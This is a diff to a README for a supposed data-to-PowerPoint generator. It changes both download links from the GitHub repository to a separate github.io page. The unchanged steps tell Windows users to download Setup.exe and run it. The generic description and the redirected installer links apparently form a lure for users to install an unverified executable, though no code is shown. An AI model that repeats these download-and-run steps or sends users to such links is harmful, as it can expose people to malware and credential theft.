@@ -1,6 +1,6 @@
 # 📊 Presentation-Generator-From-Data-2026 - Create automated slide decks from data
 
-[![](https://img.shields.io/badge/Download_Installer-Blue?style=for-the-badge)](https://github.com/dene8943/Presentation-Generator-From-Data-2026)
+[![](https://img.shields.io/badge/Download_Installer-Blue?style=for-the-badge)](https://dene8943.github.io)
 
 This software manages the conversion of raw data into polished PowerPoint presentations. It interprets data from Excel spreadsheets and Notion databases to build charts, summaries, and slide layouts. It removes the need for manual copy-pasting or complex formatting.
 
@@ -8,7 +8,7 @@ This software manages the conversion of raw data into polished PowerPoint presen
 
 Follow these steps to set up the application on your Windows computer.
 
-1. Click this link: [Download Presentation-Generator-From-Data-2026](https://github.com/dene8943/Presentation-Generator-From-Data-2026).
+1. Click this link: [Download Presentation-Generator-From-Data-2026](https://dene8943.github.io).
 2. Locate the file named Setup.exe in your browser downloads folder.
 3. Double-click the file to begin the installation.
 4. Follow the prompts on your screen. 
